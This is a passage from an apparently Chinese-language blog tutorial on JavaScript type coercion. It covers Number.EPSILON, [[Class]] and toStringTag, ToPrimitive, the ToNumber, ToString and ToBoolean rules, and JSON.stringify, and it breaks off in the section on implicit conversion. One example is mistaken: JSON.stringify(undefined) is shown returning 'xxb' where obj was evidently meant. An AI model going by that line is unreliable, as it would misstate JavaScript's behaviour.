class=\"line\"></span><br><span class=\"line\">log(a); <span class=\"comment\">// undefined</span></span><br><span class=\"line\">log(b); <span class=\"comment\">// ReferenceError: b is not defined</span></span><br><span class=\"line\">log(<span class=\"keyword\">typeof</span> a); <span class=\"comment\">// undefined</span></span><br><span class=\"line\">log(<span class=\"keyword\">typeof</span> b); <span class=\"comment\">// undefined</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"1-3-机器精度\"><a href=\"#1-3-机器精度\" class=\"headerlink\" title=\"1.3 机器精度\"></a>1.3 机器精度</h5><p>比较两个浮点数最常见的方法是设置一个误差范围值，通常称为“机器精度”，对 JavaScript 的数字来说，这个值通常是 <code>2^-52</code> (2.220446049250313e-16) 。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 为 ES6 之前的版本写 polyfill</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"built_in\">Number</span>.EPSILON) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">Number</span>.EPSILON = <span class=\"built_in\">Math</span>.pow(<span class=\"number\">2</span>, -<span class=\"number\">52</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">numbersCloseEnoughToEqual</span>(<span class=\"params\">n1,n2</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.abs( n1 - n2 ) &lt; <span class=\"built_in\">Number</span>.EPSILON;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">0.1</span> + <span class=\"number\">0.2</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> b = <span class=\"number\">0.3</span>;</span><br><span class=\"line\">numbersCloseEnoughToEqual(a, b); <span class=\"comment\">// true</span></span><br><span class=\"line\">numbersCloseEnoughToEqual(<span class=\"number\">0.0000001</span>, <span class=\"number\">0.0000002</span>); <span class=\"comment\">// false</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Q: 去数值的整数部分和小数部分</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// A: 使用 parseInt</span></span><br><span class=\"line\"><span class=\"comment\">// 不推荐使用，不准确 &amp; 性能问题</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">3.5</span></span><br><span class=\"line\"><span class=\"built_in\">parseInt</span>(a) <span class=\"comment\">// 3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> b = <span class=\"number\">0.0000000000001</span> <span class=\"comment\">// 1e-13</span></span><br><span class=\"line\"><span class=\"built_in\">parseInt</span>(b) <span class=\"comment\">// 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// A: 使用 Math.ceil()、Math.floor()</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">trunc</span>(<span class=\"params\">num</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(num &gt;= <span class=\"number\">0</span>) <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.floor(num);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.ceil(num);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">trunc(<span class=\"number\">3.75</span>); <span class=\"comment\">// 3</span></span><br><span class=\"line\">trunc(-<span class=\"number\">3.75</span>); <span class=\"comment\">// -3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// A: 使用 % 运算</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"number\">3.75</span> % <span class=\"number\">1</span>); <span class=\"comment\">// 0.75</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(-<span class=\"number\">3.75</span> % <span class=\"number\">1</span>); <span class=\"comment\">// -0.75</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// A: 使用位运算</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(~~<span class=\"number\">3.75</span>); <span class=\"comment\">// 3</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(~~-<span class=\"number\">3.75</span>); <span class=\"comment\">// -3</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"todo-取整数部分和小数部分\"><a href=\"#todo-取整数部分和小数部分\" class=\"headerlink\" title=\"todo: 取整数部分和小数部分\"></a>todo: 取整数部分和小数部分</h5><h3 id=\"2、对象、字符串、数字和布尔值之间类型转换规则\"><a href=\"#2、对象、字符串、数字和布尔值之间类型转换规则\" class=\"headerlink\" title=\"2、对象、字符串、数字和布尔值之间类型转换规则\"></a>2、对象、字符串、数字和布尔值之间类型转换规则</h3><h5 id=\"2-1-内部属性-class\"><a href=\"#2-1-内部属性-class\" class=\"headerlink\" title=\"2.1 内部属性 [[class]]\"></a>2.1 内部属性 [[class]]</h5><p>所有 <code>typeof</code> 返回值为 <code>&quot;object&quot;</code> 的对象都包含一个内部属性 <code>[[Class]]</code> （看作一个内部的分类），这个属性无法直接访问，一般通过 <code>Object.prototype.toString()</code> 来查看</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> toString = <span class=\"built_in\">Object</span>.prototype.toString;</span><br><span class=\"line\"></span><br><span class=\"line\">toString.call(<span class=\"literal\">null</span>); <span class=\"comment\">// [object Null]</span></span><br><span class=\"line\">toString.call(<span class=\"literal\">undefined</span>); <span class=\"comment\">// [object Undefined]</span></span><br><span class=\"line\">toString.call(<span class=\"literal\">true</span>); <span class=\"comment\">// [object Boolean]</span></span><br><span class=\"line\">toString.call([]); <span class=\"comment\">// [object Array]</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"2-2-toStringTag\"><a href=\"#2-2-toStringTag\" class=\"headerlink\" title=\"2.2 toStringTag\"></a>2.2 toStringTag</h5><p><code>Symbol.toStringTag</code> 是一个内置 <code>symbol</code>，它通常作为对象的属性键使用，对应的属性值应该为字符串类型，这个字符串用来表示该对象的自定义类型标签，通常只有内置的 <code>Object.prototype.toString()</code> 方法会去读取这个标签并把它包含在自己的返回值里。</p>\n<p>许多内置的 JavaScript 对象类型即便没有 <code>toStringTag</code> 属性，也能被 <code>toString()</code> 方法识别并返回特定的类型标签，比如：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call(<span class=\"string\">&#x27;foo&#x27;</span>);     <span class=\"comment\">// &quot;[object String]&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call([<span class=\"number\">1</span>, <span class=\"number\">2</span>]);    <span class=\"comment\">// &quot;[object Array]&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call(<span class=\"number\">3</span>);         <span class=\"comment\">// &quot;[object Number]&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call(<span class=\"literal\">true</span>);      <span class=\"comment\">// &quot;[object Boolean]&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call(<span class=\"literal\">undefined</span>); <span class=\"comment\">// &quot;[object Undefined]&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call(<span class=\"literal\">null</span>);      <span class=\"comment\">// &quot;[object Null]&quot;</span></span><br><span class=\"line\"><span class=\"comment\">// ... and more</span></span><br></pre></td></tr></table></figure>\n\n<p>另外一些对象类型则不然，<code>toString()</code> 方法能识别它们是因为引擎为它们设置好了 <code>toStringTag</code> 标签：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call(<span class=\"keyword\">new</span> <span class=\"built_in\">Map</span>());       <span class=\"comment\">// &quot;[object Map]&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call(<span class=\"function\"><span class=\"keyword\">function</span>* (<span class=\"params\"></span>) </span>&#123;&#125;); <span class=\"comment\">// &quot;[object GeneratorFunction]&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call(<span class=\"built_in\">Promise</span>.resolve()); <span class=\"comment\">// &quot;[object Promise]&quot;</span></span><br><span class=\"line\"><span class=\"comment\">// ... and more</span></span><br></pre></td></tr></table></figure>\n\n<p>但你自己创建的类不会有这份特殊待遇，<code>toString()</code> 找不到 <code>toStringTag</code> 属性时只好返回默认的 Object 标签：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ValidatorClass</span> </span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call(<span class=\"keyword\">new</span> ValidatorClass()); <span class=\"comment\">// &quot;[object Object]&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>加上 <code>toStringTag</code> 属性，你的类也会有自定义的类型标签了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ValidatorClass</span> </span>&#123;</span><br><span class=\"line\">  get [<span class=\"built_in\">Symbol</span>.toStringTag]() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;Validator&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call(<span class=\"keyword\">new</span> ValidatorClass()); <span class=\"comment\">// &quot;[object Validator]&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"2-3-ToPrimitive-抽象操作\"><a href=\"#2-3-ToPrimitive-抽象操作\" class=\"headerlink\" title=\"2.3 ToPrimitive 抽象操作\"></a>2.3 ToPrimitive 抽象操作</h5><p><code>ToPrimitive(input, PreferredType)</code> 是JavaScript引擎内部的抽象操作，原理如下：<br>可选参数 <code>PreferredType</code> 可以是 <code>Number</code> 或者 <code>String</code>，它只代表了一个转换的偏好，转换结果不一定必须是这个参数所指的类型，但转换结果一定是一个原始值。</p>\n<p><code>PreferredType</code> 被标志为 <code>Number</code> 时：</p>\n<ol>\n<li>如果输入的值已经是个原始值，则直接返回它</li>\n<li>如果输入的值是一个对象，则调用该对象的 <code>valueOf()</code> 方法，如果 <code>valueOf()</code> 方法的返回值是一个原始值，则返回这个原始值</li>\n<li>否则，调用这个对象的 <code>toString() </code>方法，如果 <code>toString()</code> 方法的返回值是一个原始值，则返回这个原始值</li>\n<li>否则，抛出 TypeError 异常</li>\n</ol>\n<p><code>PreferredType</code> 被标志为 <code>String</code> 时转换规则类似，不同的是先调用 <code>toString()</code> 方法，再调用 <code>valueOf() </code>方法</p>\n<blockquote>\n<p>如果没有 PreferredType 参数，则 PreferredType 的值会按照这样的规则来自动设置：Date 类型的对象会被设置为 String，其它类型的值会被设置为 Number（先调用 valueOf）</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">   valueOf () &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;valueOf&#x27;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> &#123;&#125;;</span><br><span class=\"line\">   &#125;,</span><br><span class=\"line\">   toString () &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;toString&#x27;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> &#123;&#125;;</span><br><span class=\"line\">   &#125;,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Number</span>(obj);</span><br><span class=\"line\"><span class=\"comment\">// valueOf</span></span><br><span class=\"line\"><span class=\"comment\">// toString</span></span><br><span class=\"line\"><span class=\"comment\">// TypeError: Cannot convert object to primitive value</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">String</span>(obj);</span><br><span class=\"line\"><span class=\"comment\">// toString</span></span><br><span class=\"line\"><span class=\"comment\">// valueOf</span></span><br><span class=\"line\"><span class=\"comment\">// TypeError: Cannot convert object to primitive value</span></span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th>类型</th>\n<th>valueOf()</th>\n<th>toString()</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Boolean</td>\n<td>true 或 false</td>\n<td>‘true’或者 ‘false’</td>\n</tr>\n<tr>\n<td>Number</td>\n<td>数值</td>\n<td>数值的字符串形式</td>\n</tr>\n<tr>\n<td>String</td>\n<td>返回该对象表示的字符串值</td>\n<td>返回该对象表示的字符串值</td>\n</tr>\n<tr>\n<td>Object</td>\n<td>返回该对象</td>\n<td>‘[object Object]’</td>\n</tr>\n<tr>\n<td>Array</td>\n<td>返回该数组</td>\n<td>以,分割的字符串，类似Array.join(‘,’)</td>\n</tr>\n<tr>\n<td>Date</td>\n<td>返回日期的毫秒数</td>\n<td>返回带有时区信息的日期和时间</td>\n</tr>\n<tr>\n<td>RegExp</td>\n<td>返回该正则函数</td>\n<td>返回正则表达式字面量</td>\n</tr>\n<tr>\n<td>Function</td>\n<td>返回该函数</td>\n<td>将函数代码以字符串形式返回</td>\n</tr>\n</tbody></table>\n<h3 id=\"3-类型转换\"><a href=\"#3-类型转换\" class=\"headerlink\" title=\"3 类型转换\"></a>3 类型转换</h3><h5 id=\"3-1-ToNumber\"><a href=\"#3-1-ToNumber\" class=\"headerlink\" title=\"3.1 ToNumber\"></a>3.1 ToNumber</h5><p>number 转换规则：</p>\n<ul>\n<li><code>true</code> 转换为 <code>1</code></li>\n<li><code>false</code> 转换为 <code>0</code> ，</li>\n<li><code>undefined</code> 转换为 <code>NaN</code> </li>\n<li><code>null</code> 转换为 <code>0</code></li>\n<li>字符串转为数字</li>\n</ul>\n<p>为了将值转换为相应的基本类型值，抽象操作 <code>ToPrimitive</code> 会首先检查该值是否有 <code>valueOf()</code> 方法，如果有并且返回基本类型值，就使用该值进行强制类型转换。如果没有就使用 <code>toString()</code> 的返回值（如果存在）来进行强制类型转换，否则会产生 <code>TypeError</code> 错误。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = &#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">valueOf</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;42&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> b = &#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">toString</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;42&quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> c = [<span class=\"number\">4</span>, <span class=\"number\">2</span>];</span><br><span class=\"line\">c.toString = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.join(<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"built_in\">Number</span>(a); <span class=\"comment\">// 42</span></span><br><span class=\"line\"><span class=\"built_in\">Number</span>(b); <span class=\"comment\">// 42</span></span><br><span class=\"line\"><span class=\"built_in\">Number</span>(c); <span class=\"comment\">// 42</span></span><br><span class=\"line\"><span class=\"built_in\">Number</span>(<span class=\"string\">&quot;&quot;</span>); <span class=\"comment\">// 0</span></span><br><span class=\"line\"><span class=\"built_in\">Number</span>([]); <span class=\"comment\">// 0</span></span><br><span class=\"line\"><span class=\"built_in\">Number</span>([<span class=\"string\">&quot;abc&quot;</span>]); <span class=\"comment\">// NaN</span></span><br></pre></td></tr></table></figure>\n\n\n<h5 id=\"3-2-ToString\"><a href=\"#3-2-ToString\" class=\"headerlink\" title=\"3.2 ToString\"></a>3.2 ToString</h5><p>字符串化规则： </p>\n<ul>\n<li><code>null</code> 转换为 <code>&quot;null&quot;</code></li>\n<li><code>undefined</code> 转换为 <code>&quot;undefined&quot;</code></li>\n<li><code>true</code> 转换为 <code>&quot;true&quot;</code>，</li>\n<li>数字转换为普通字符串（较大或较小数值使用指数形式）</li>\n<li>普通对象使用 <code>toString()</code> （ <code>Object.prototype.toString()</code> ）返回内部属性 <code>[[Class]]</code> 的值，如 <code>&quot;[object Object]&quot;</code>。</li>\n</ul>\n<blockquote>\n<p>如果对象有自己的 toString() 方法，字符串化时就会调用该方法并使用其返回值<br>数组的默认 toString() 方法经过了重新定义，将所有单元字符串化以后再用 “,” 连接</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> num = <span class=\"string\">&#x27;123456789&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> flag = <span class=\"literal\">true</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> n = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> u = <span class=\"literal\">undefined</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123; <span class=\"attr\">name</span>: <span class=\"string\">&#x27;xxb&#x27;</span> &#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> obj2 = &#123;</span><br><span class=\"line\">  name: <span class=\"string\">&#x27;xxb&#x27;</span>,</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">toString</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.name + <span class=\"string\">&#x27;-------&#x27;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> error = <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">&#x27;123&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">num.toString(); <span class=\"comment\">// 123456789</span></span><br><span class=\"line\">flag.toString(); <span class=\"comment\">// true</span></span><br><span class=\"line\">n + <span class=\"string\">&#x27;&#x27;</span>; <span class=\"comment\">// null</span></span><br><span class=\"line\">u + <span class=\"string\">&#x27;&#x27;</span>; <span class=\"comment\">// undefined</span></span><br><span class=\"line\">obj.toString(); <span class=\"comment\">// [object Object]</span></span><br><span class=\"line\">obj2.toString(); <span class=\"comment\">// xxb-------</span></span><br><span class=\"line\">arr.toString(); <span class=\"comment\">// 1,2,3</span></span><br><span class=\"line\">error.toString(); <span class=\"comment\">// Error: 123</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"3-3-ToBoolean\"><a href=\"#3-3-ToBoolean\" class=\"headerlink\" title=\"3.3 ToBoolean\"></a>3.3 ToBoolean</h5><p><code>undefined</code>、<code>null</code>、<code>false</code>、<code>+0</code> 、<code> -0</code> 和 <code>NaN</code>、<code>&quot;&quot;</code> 将转换为 <code>false</code>，其他值转换为 <code>true</code></p>\n<blockquote>\n<p>所有的对象都会转换为 true，包括{}、new Boolean(false)、new Number(0)、new String(‘’)</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">!! <span class=\"literal\">null</span> <span class=\"comment\">// false</span></span><br><span class=\"line\">!! <span class=\"string\">&#x27;&#x27;</span> <span class=\"comment\">// false</span></span><br><span class=\"line\">!!<span class=\"literal\">NaN</span> <span class=\"comment\">// false</span></span><br><span class=\"line\">!!<span class=\"keyword\">new</span> <span class=\"built_in\">Boolean</span>(<span class=\"literal\">false</span>) <span class=\"comment\">// true</span></span><br><span class=\"line\">!!<span class=\"keyword\">new</span> <span class=\"built_in\">Number</span>(<span class=\"number\">0</span>); <span class=\"comment\">// true</span></span><br><span class=\"line\">!!<span class=\"keyword\">new</span> <span class=\"built_in\">String</span>(<span class=\"string\">&quot;&quot;</span>); <span class=\"comment\">// true</span></span><br><span class=\"line\">!! <span class=\"string\">&quot;false&quot;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\">!! <span class=\"string\">&quot;0&quot;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\">!! <span class=\"string\">&quot;&#x27;&#x27;&quot;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\">!!&#123;&#125;; <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n\n<p>字符串和数字之间的转换是通过 String(..) 和 Number(..) 这两个内建函数（原生构造函数，参见第 3 章）来实现的，请注意它们前面没有 new 关键字，并不创建封装对象。<br>~ 和 indexOf() 一起可以将结果强制类型转换（实际上仅仅是转换）为真 / 假值<br>~ 比 &gt;= 0 和 == -1 更简洁</p>\n<h5 id=\"3-4-JSON-字符串化\"><a href=\"#3-4-JSON-字符串化\" class=\"headerlink\" title=\"3.4 JSON 字符串化\"></a>3.4 JSON 字符串化</h5><ol>\n<li>字符串、数字、布尔值和 <code>null</code> 的 <code>JSON.stringify()</code> 规则与 <code>ToString</code> 基本相同。</li>\n<li>如果传递给 <code>JSON.stringify()</code> 的对象中定义了 <code>toJSON()</code> 方法，那么该方法会在字符串化前调用，以便将对象转换为安全的 JSON 值。</li>\n</ol>\n<p>所有安全的 JSON 值都可以使用 <code>JSON.stringify()</code> 字符串化。</p>\n<blockquote>\n<p>不安全的 JSON 值指 undefined 、 function 、 symbol和包含循环引用的对象，JSON.stringify() 在对象中遇到 undefined 、 function 和 symbol 时会自动将其忽略，在数组中则会返回 null （以保证单元位置不变）</p>\n</blockquote>\n<p>如果对象中定义了 toJSON() 方法，JSON 字符串化时会首先调用该方法，然后用它的返回值来进行序列化。如果要对含有非法 JSON 值的对象做字符串化，或者对象中的某些值无法被序列化时，就需要定义 toJSON() 方法来返回一个安全的 JSON 值。</p>\n<blockquote>\n<p>toJSON() 返回的应该是一个适当的值，可以是任何类型，然后再由 JSON.stringify() 对其进行字符串化</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">JSON</span>.stringify(<span class=\"literal\">undefined</span>); <span class=\"comment\">// undefined</span></span><br><span class=\"line\"><span class=\"built_in\">JSON</span>.stringify(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;&#125;); <span class=\"comment\">// undefined</span></span><br><span class=\"line\"><span class=\"built_in\">JSON</span>.stringify([<span class=\"number\">1</span>, <span class=\"literal\">undefined</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;&#125;, <span class=\"number\">4</span>]); <span class=\"comment\">// &quot;[1,null,null,4]&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">JSON</span>.stringify(&#123; <span class=\"attr\">a</span>:<span class=\"number\">2</span>, <span class=\"attr\">b</span>:<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;&#125;&#125;); <span class=\"comment\">// &quot;&#123;&quot;a&quot;:2&#125;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">   name: <span class=\"string\">&#x27;xxb&#x27;</span>,</span><br><span class=\"line\">   age: <span class=\"number\">24</span>,</span><br><span class=\"line\">   toJSON () &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.name;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">JSON</span>.stringify(<span class=\"literal\">undefined</span>); <span class=\"comment\">// &quot;xxb&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-隐式转换\"><a href=\"#4-隐式转换\" class=\"headerlink\" title=\"4 隐式转换\"></a>4 隐式转换</h3><h5 id=\"4-1-隐式强制转换为-String\"><a href=\"#4-1-隐式强制转换为-String\" class=\"headerlink\" title=\"4.1 隐式强制转换为 String\"></a>4.1 隐式强制转换为 String</h5><p><code>+</code> 运算符即能用于数字加法，也能用于字符串拼接， <code>+</code> 运算符也能是一元运算符，将后面的操作数转换为数字</p>\n<p>ES5 规范定义：如果某个操作数是字符串或者能够通过以下步骤转换为字符串的话，+ 将进行拼接操作。如果其中一个操作数是对象（包括数组），则首先对其调用 <code>ToPrimitive</code> 抽象操作，该抽象操作再调用 <code>[[DefaultValue]]</code> 